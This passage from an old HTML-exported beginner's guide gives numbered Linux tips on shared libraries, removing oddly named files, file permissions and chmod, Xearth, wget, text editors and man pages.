lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >MacOS-like shell in X Window and will run various MacOS programs.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A new commercial program is now available for every OS. It is called VMware and will create</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >a virtual PC, allowing you to run nearly any operating system, including DOS, Windows NT</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >and FreeBSD. It is very stable and comes with a 30 day free license.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.18</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 18: Shared library not found</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Binaries need to load shared libraries at runtime. They are files on your system that provide functions to the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >program. Sometimes the program will report that a shared library was not found, and it will abort.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To find which libraries a program needs, you can use the ldd program. It will list all those libraries and those</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >missing. If you know that a library is installed, maybe you need to add it to the current library path. The path</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >used to look for shared libraries is in /etc/ld.so.conf. You can modify that file and add any path you want,</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >then as root run the ldconfig program.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.19</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 19: Hard to erase files</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >File names in Linux can have many letters and numbers in them. Usualy, names should not have spaces in</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >them, although Linux can deal with them. There are some characters that should not be used in files, like "/"</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >and "~".</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Some programs unfortunately will create strange looking file names, often as temporary files. Using the rm</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >command, you should be able to remove them, but it may be hard when strange alphanumeric characters are</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >used. Here are a few ways you should try to get rid of a file with a strange name:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >First you should try the following:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >rm -f "file name"</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If this doesn't work you should try the console program mc.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >With graphical file managers, you should be able to pick an icon and remove it, regardless of</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >the file name.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.20</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 20: Files permissions</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When you try to run a file it may refuse to work with an error like "Permission denied" and when you try to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >view another file it may also say that you don't have permission to view it. These all come down to file</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >permissions, a basic feature of Unix.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >There are 3 types of permissions: read, write and execute. When you list files it will say which permission the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >files have:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >ls -l file.dat</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >-rw-r--r-- 1 root users 1656 Mar 22 00:27 file.dat</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The first part of that line is the permissions. They are, in order, the user permissions, the group permissions</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >and others permissions, where r means read, w means write and x means execute. For this file, the user, root,</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >has read and write permission (rw-), the group, users, can only read the file (r--) and everyone else can also</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >only read the file (r--).</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Other letters may appear. The first letter is - for a normal file, d for a directory and c or b for a device. In</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >place of x you may see a letter s. This means that when you start a program, it will run as its owner.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.21</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 21: Changing file permissions</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To change a file's permissions, you need to use a program called chmod. With that command you can change</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >one or multiple file permissions. Here are a few examples:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >$ chmod 755 file</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >$ ls -l file</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >-rwxr-xr-x 1 root users 1656 Mar 22 00:27 file</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >$ chmod 700 file</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >$ ls -l file</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >-rwx------ 1 root users 1656 Mar 22 00:27 file</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >$ chmod 664 file</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >$ ls -l file</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >-rw-rw-r-- 1 root users 1656 Mar 22 00:27 file</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The numbers are based on the 3 types of permissions. Read = 4, write = 2 and execute = 1. A permission of</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >755 means the user will have read, write and execute permissions (4 + 2 + 1 = 7), and everyone else will have</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >read and execute permissions (4 + 1 = 5).</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.22</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 22: An international background</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To set a background in X Window, most of the time you will use XV or a similar program to set a static</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >image. But there is a program out there that allows you to put something useful on your background.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >Xearth, available from </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.cs.colorado.edu/~tuna/xearth/index.html</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >, is a program that will display a</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >map of the world on your background, with some useful information. The main use is to display where the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >sun currently lights the planet. It will also display the current time, and stars in the sky if you want to.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Several options exist. By default, Xearth will show a round planet, but you can make it display a rectangular</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >map:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >xearth -proj merc</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Other options are available, including mono display, the number of colors, and the running priority.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.23</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 23: Powerful file transfer system</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Downloading several directories from an FTP server, or mirroring a web site, can be hard to do using</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >traditional file transfer programs.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >A program called wget is available from the GNU archive at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >ftp://ftp.gnu.org</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. This is a powerful program</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >allowing you to do advanced functions like fetching recursive directories and even retrieving full web sites.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A graphical frontend using the GTK library is available from</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  ><A rel="nofollow" href="http://usuarios.meridian.es/frimost1/gwget/gwget.htm"  ><FONT face="Times New Roman"  >http://usuarios.meridian.es/frimost1/gwget/gwget.htm</FONT></A></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.24</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 24: Editing in text editors</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >One common complaint among new Linux users is that vi or other text editors are too hard to use. That may</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >be true, but they aren't the only available editors.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Experts used to tell new users to learn ed or vi and that they would not regret it. It was true in the past, but it</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >is no longer necessary to learn hard to use editors to do powerful text editing.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Graphical editors most likely came with your distribution. You may not have installed them, but they are on</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >your CD-ROM. Some exemples are pico, a console full screen text editor, and emacs, which work on console</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >and X Window, and is a very powerful text editor.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Desktop interfaces such as GNOME an KDE each come with their own text editors too. You can even find</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >more editors on the Web.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.25</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 25: Documentation and manual</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Software under Linux rarely comes with printed documentation. Some do, like the GIMP and Blender, but</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >most only come with online documentation. This way, you can get the documentation at the same time that</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >you download the program.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >There are 2 traditional ways to provide documentation under Unix and Linux:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The first is man pages. These are small files containing information about every command you have on your</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; 